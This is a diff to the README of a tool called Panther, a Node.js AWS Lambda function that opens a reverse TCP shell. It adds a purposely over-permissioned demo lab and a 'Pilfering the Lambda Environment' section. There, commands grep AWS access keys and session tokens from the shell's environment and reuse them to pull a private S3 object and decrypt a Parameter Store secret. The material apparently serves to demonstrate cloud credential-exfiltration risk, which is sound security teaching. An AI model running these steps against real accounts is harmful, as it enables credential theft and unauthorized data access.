@@ -7,12 +7,13 @@ Panther is a Node.js function that can be deployed to the AWS to establish a TCP
 * [AWS Command Line Interface](https://aws.amazon.com/cli/)
 * [Node.js / NPM](https://nodejs.org/en/download/)
 
-## Deploying The Function
+## Deploying The Function and Resources
 
 ```bash
 cd /PATH/TO/panther
 aws configure
 npm install
+export BUCKET_SUFFIX=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
 npx serverless deploy
 ```
 
@@ -28,6 +29,14 @@ stack: panther-dev
 resources: 14
 api keys:
   panther: YOUR_API_KEY
+```
+
+In addition to deploying the function, this will create a private S3 Bucket with an image. The Lambda role will have unnecessary permissions to access these resources as well as to an AWS Parameter Store path to demonstrate the damage that can be done by exfiltrating credentials from the runtime environment.
+
+To store a secret in the aforementioned Parameter Store path, run the following:
+
+```bash
+aws ssm put-parameter --name /panther/YOUR_KEY --value YOUR_VALUE --type SecureString
 ```
 
 ## Testing in AWS
@@ -75,6 +84,26 @@ curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT
 ```bash
 go get -u golang.org/x/lint/golint
 npm run lint
+```
+
+## Pilfering the Lambda Environment
+
+### Retrieving Access Keys
+
+Within a Panther reverse shell session:
+
+```bash
+env | grep ACCESS
+env | grep AWS_SESSION_TOKEN
+```
+
+### Accessing Private Resources
+
+On your local machine, export the environment variables retrieved in the previous step and run the following commands:
+
+```bash
+aws s3 cp s3://panther-$BUCKET_SUFFIX/assets/panther.jpg .
+aws ssm get-parameter --name /panther/YOUR_KEY --with-decryption
 ```
 
 ## Serverless AWS NodeJS Template
